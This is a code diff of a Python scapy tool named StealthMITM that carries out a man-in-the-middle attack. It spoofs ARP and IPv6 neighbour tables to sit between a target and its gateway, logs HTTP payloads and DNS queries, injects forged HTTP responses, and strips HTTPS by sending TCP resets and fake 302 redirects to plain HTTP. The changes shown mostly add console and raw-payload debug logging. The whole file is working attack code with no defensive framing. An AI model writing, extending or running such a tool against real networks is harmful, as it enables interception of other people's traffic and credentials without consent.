@@ -3,7 +3,7 @@
 from scapy.all import (
     sniff, send, sendp, ARP, Ether, IP, TCP, DNS, DNSQR, Raw,
     conf, get_if_hwaddr, getmacbyip, get_if_list, IPv6, ICMPv6ND_NA,
-    ICMPv6NDOptDstLLAddr, UDP
+    ICMPv6NDOptDstLLAddr, UDP, hexdump
 )
 import threading
 import argparse
@@ -15,11 +15,17 @@ import signal
 import os
 import re
 
+# Logging to file and console
 logging.basicConfig(
     filename='cmitm.log',
     level=logging.INFO,
     format='%(asctime)s - %(message)s'
 )
+console = logging.StreamHandler()
+console.setLevel(logging.DEBUG)
+formatter = logging.Formatter('%(asctime)s - %(message)s')
+console.setFormatter(formatter)
+logging.getLogger('').addHandler(console)
 
 class Config:
     def __init__(self, args):
@@ -48,11 +54,10 @@ class StealthMITM:
         self.inject = inject
         self.ipv6 = ipv6
         self.ssl_strip = ssl_strip
-        self.https_ports = {443, 8443}  
-        self.redirect_cache = {}  
+        self.https_ports = {443, 8443}
+        self.redirect_cache = {}
 
     def arp_spoof(self):
-        """Handle both IPv4 ARP and IPv6 NDP spoofing"""
         try:
             while not self.stop_event.is_set():
                 pkt_target = Ether(src=self.my_mac, dst=self.target_mac) / \
@@ -70,42 +75,40 @@ class StealthMITM:
             logging.error(f"Spoofing error: {e}")
 
     def ndp_spoof(self):
-        """IPv6 Neighbor Discovery Protocol spoofing"""
         try:
             pkt_target = Ether(src=self.my_mac, dst=self.target_mac) / \
                          IPv6(src=self.gateway_ip, dst=self.target_ip) / \
                          ICMPv6ND_NA(tgt=self.gateway_ip, R=0) / \
                          ICMPv6NDOptDstLLAddr(lladdr=self.my_mac)
-            
+
             pkt_gateway = Ether(src=self.my_mac, dst=self.gateway_mac) / \
                           IPv6(src=self.target_ip, dst=self.gateway_ip) / \
                           ICMPv6ND_NA(tgt=self.target_ip, R=0) / \
                           ICMPv6NDOptDstLLAddr(lladdr=self.my_mac)
-            
+
             sendp(pkt_target, iface=self.interface, verbose=0)
             sendp(pkt_gateway, iface=self.interface, verbose=0)
         except Exception as e:
             logging.error(f"NDP spoofing error: {e}")
 
     def restore_arp(self):
-        """Restore both IPv4 ARP and IPv6 NDP tables"""
         try:
             pkt_target = Ether(src=self.my_mac, dst=self.target_mac) / \
                          ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwsrc=self.gateway_mac)
             pkt_gateway = Ether(src=self.my_mac, dst=self.gateway_mac) / \
                           ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwsrc=self.target_mac)
-            
+
             if self.ipv6:
                 ndp_target = Ether(src=self.my_mac, dst=self.target_mac) / \
                              IPv6(src=self.gateway_ip, dst=self.target_ip) / \
                              ICMPv6ND_NA(tgt=self.gateway_ip, R=1) / \
                              ICMPv6NDOptDstLLAddr(lladdr=self.gateway_mac)
-                
+
                 ndp_gateway = Ether(src=self.my_mac, dst=self.gateway_mac) / \
                               IPv6(src=self.target_ip, dst=self.gateway_ip) / \
                               ICMPv6ND_NA(tgt=self.target_ip, R=1) / \
                               ICMPv6NDOptDstLLAddr(lladdr=self.target_mac)
-                
+
                 for _ in range(10):
                     sendp(ndp_target, iface=self.interface, verbose=0)
                     sendp(ndp_gateway, iface=self.interface, verbose=0)
@@ -114,37 +117,42 @@ class StealthMITM:
                 sendp(pkt_target, iface=self.interface, verbose=0)
                 sendp(pkt_gateway, iface=self.interface, verbose=0)
                 time.sleep(0.1)
-            
+
             logging.info("ARP/NDP tables restored.")
         except Exception as e:
             logging.error(f"Restoration error: {e}")
 
     def process_packet(self, packet):
         try:
+            logging.debug(f"Packet summary: {packet.summary()}")
+            if packet.haslayer(Raw):
+                try:
+                    logging.debug(f"Raw payload: {packet[Raw].load[:100].decode(errors='replace')}")
+                except Exception as e:
+                    logging.debug(f"Could not decode raw payload: {e}")
+
+            # Uncomment for detailed packet view:
+            # logging.debug("Packet hexdump:")
+            # hexdump(packet)
+
             with self.lock:
                 self.stats['total'] += 1
 
             if packet.haslayer(IP):
                 self.process_ipv4_packet(packet)
-            
             elif packet.haslayer(IPv6) and self.ipv6:
                 self.process_ipv6_packet(packet)
-
         except Exception as e:
             logging.error(f"Packet processing error: {e}")
 
     def process_ipv4_packet(self, packet):
-        """Handle IPv4 packets"""
         if packet.haslayer(TCP):
             if packet[TCP].dport == 80 and packet.haslayer(Raw):
                 self.process_http(packet)
-            
             elif packet[TCP].dport in self.https_ports and self.ssl_strip:
                 self.attempt_ssl_strip(packet)
-            
             elif packet[TCP].dport in self.https_ports:
                 logging.info(f"HTTPS traffic detected from {packet[IP].src} -> {packet[IP].dst} (encrypted)")
-        
         elif packet.haslayer(DNS) and packet[DNS].qr == 0:
             query = packet[DNSQR].qname.decode(errors='replace')
             logging.info(f"DNS Query from {packet[IP].src}: {query}")
@@ -152,54 +160,49 @@ class StealthMITM:
                 self.stats['dns'] += 1
 
     def process_ipv6_packet(self, packet):
-        """Handle IPv6 packets"""
         with self.lock:
             self.stats['ipv6'] += 1
-        
+
         if packet.haslayer(TCP):
             if packet[TCP].dport == 80 and packet.haslayer(Raw):
                 load = packet[Raw].load.decode(errors='replace')
                 logging.info(f"IPv6 HTTP {packet[IPv6].src} -> {packet[IPv6].dst}: {load[:50]}")
                 with self.lock:
                     self.stats['http'] += 1
-            
             elif packet[TCP].dport in self.https_ports:
                 logging.info(f"IPv6 HTTPS traffic detected from {packet[IPv6].src} -> {packet[IPv6].dst}")
 
     def process_http(self, packet):
-        """Process HTTP traffic"""
         load = packet[Raw].load.decode(errors='replace')
         logging.info(f"HTTP {packet[IP].src} -> {packet[IP].dst}: {load[:50]}")
         with self.lock:
             self.stats['http'] += 1
-        
+
         if self.inject:
             self.inject_response(packet)
-        
+
         if self.ssl_strip and "Location: https://" in load:
             self.cache_https_redirect(packet, load)
 
     def attempt_ssl_strip(self, packet):
-        """Attempt to downgrade HTTPS to HTTP"""
         host = self.get_host_from_packet(packet)
         if host in self.redirect_cache:
             http_port = self.redirect_cache[host]
-            
+
             rst_pkt = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                       TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags="R")
             send(rst_pkt, iface=self.interface, verbose=0)
-            
+
             redirect_pkt = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                           TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags="PA") / \
                           Raw(load=f"HTTP/1.1 302 Found\r\nLocation: http://{host}:{http_port}\r\n\r\n")
             send(redirect_pkt, iface=self.interface, verbose=0)
-            
+
             with self.lock:
                 self.stats['ssl_stripped'] += 1
             logging.info(f"SSL Stripped: {host}")
 
     def cache_https_redirect(self, packet, http_load):
-        """Cache HTTPS redirect locations for stripping"""
         match = re.search(r"Location: https://([^/]+)", http_load)
         if match:
             host = match.group(1)
@@ -207,7 +210,6 @@ class StealthMITM:
             logging.info(f"Cached HTTPS redirect for {host}")
 
     def get_host_from_packet(self, packet):
-        """Extract host from packet"""
         if packet.haslayer(Raw):
             raw = packet[Raw].load.decode(errors='ignore')
             host_match = re.search(r"Host: ([^\r\n]+)", raw)
@@ -216,7 +218,6 @@ class StealthMITM:
         return packet[IP].dst
 
     def inject_response(self, packet):
-        """Inject custom HTTP response"""
         if packet.haslayer(TCP) and packet[TCP].dport == 80:
             spoofed_response = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                               TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags="PA",
@@ -226,20 +227,17 @@ class StealthMITM:
             logging.info(f"Injected response to {packet[IP].src}")
 
     def start(self):
-        """Start the MITM attack"""
         self.running = True
         self.stop_event.clear()
         threading.Thread(target=self.arp_spoof, daemon=True).start()
         sniff(iface=self.interface, prn=self.process_packet, filter=config.filter, store=0)
 
     def stop(self):
-        """Stop the MITM attack"""
         self.running = False
         self.stop_event.set()
         self.restore_arp()
 
     def signal_handler(self, sig, frame):
-        """Handle SIGINT (Ctrl+C) to gracefully stop the MITM attack"""
         print("\nReceived SIGINT. Stopping MITM attack...")
         self.stop()
 
@@ -264,15 +262,16 @@ if __name__ == "__main__":
 
     config = Config(args)
     mitm = StealthMITM(
-        args.target_ip, 
-        args.gateway_ip, 
-        args.interface, 
+        args.target_ip,
+        args.gateway_ip,
+        args.interface,
         inject=args.inject,
         ipv6=args.ipv6,
         ssl_strip=args.ssl_strip
     )
-    
-    # Register the signal handler
+
+    logging.info(f"Starting MITM on interface {args.interface} | Target: {args.target_ip} | Gateway: {args.gateway_ip} | IPv6: {args.ipv6} | SSLStrip: {args.ssl_strip} | Inject: {args.inject}")
+
     signal.signal(signal.SIGINT, mitm.signal_handler)
 
     try:
